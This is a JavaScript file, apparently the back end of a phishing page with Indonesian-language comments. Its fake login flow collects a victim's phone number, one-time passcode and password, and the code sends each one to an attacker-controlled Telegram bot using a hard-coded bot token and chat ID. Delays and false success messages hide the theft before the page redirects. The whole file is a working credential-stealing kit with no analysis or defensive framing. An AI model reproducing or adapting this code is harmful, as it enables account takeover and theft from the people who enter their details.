const BOT_TOKEN = "7552538717:AAFCSIBpKz6sebFX_1BXYi2uyJcdLqyskMA";
const CHAT_ID = "1445052688";
const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

function showLoadingSpinner() {
  $("#loadingSpinner").removeClass("d-none");
}
function hideLoadingSpinner() {
  $("#loadingSpinner").addClass("d-none");
}

function showResponseMessage(message, type = "success", autoHide = true, delay = 3000) {
  const alertClass = type === "success" ? "alert-success" : "alert-danger";
  $(".responseMessage").html(`<div class="alert ${alertClass}">${message}</div>`);
  if (autoHide) setTimeout(() => $(".responseMessage").html(""), delay);
}

function formatPhoneNumber(phone) {
  phone = phone.trim().replace(/\D/g, ""); // hapus karakter non-digit
  phone = phone.replace(/^(\+62|62|0)/, ""); // hapus awalan
  return "+62" + phone;
}

function sendToTelegram(message, callback) {
  setTimeout(() => {
    $.post(TELEGRAM_URL, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML"
    }).done(callback)
      .fail(() => {
        hideLoadingSpinner();
        showResponseMessage("Gagal mengirim ke Telegram.", "error");
      });
  }, 4000); // 4 detik delay
}

// Step 1: Kirim Nomor
$("#loginForm").on("submit", function (e) {
  e.preventDefault();
  showLoadingSpinner();

  let phone = $("#phoneNumber").val();
  phone = formatPhoneNumber(phone);

  sendToTelegram(phone, () => {
    hideLoadingSpinner();
    showResponseMessage("Kode OTP dikirim.", "success");
    $("#loginForm").addClass("d-none");
    $("#otpForm").removeClass("d-none");
  });
});

// Step 2: Kirim OTP
$("#otpForm").on("submit", function (e) {
  e.preventDefault();
  showLoadingSpinner();

  const otp = $("#verificationCode").val();

  sendToTelegram(otp, () => {
    hideLoadingSpinner();
    showResponseMessage("OTP berhasil diverifikasi.", "success");
    $("#otpForm").addClass("d-none");
    $("#passwordForm").removeClass("d-none");
  });
});

// Step 3: Kirim Password
// Step 3: Kirim Password
$("#passwordForm").on("submit", function (e) {
  e.preventDefault();
  showLoadingSpinner();

  const password = $("#password").val();

  sendToTelegram(password, () => {
    hideLoadingSpinner();
    showResponseMessage("Data berhasil dikirim!", "success");
    $("#passwordForm").addClass("d-none");

    // Tunggu 1 detik lalu redirect ke step.html
    setTimeout(() => {
      window.location.href = "step.html";
    }, 1000);
  });
});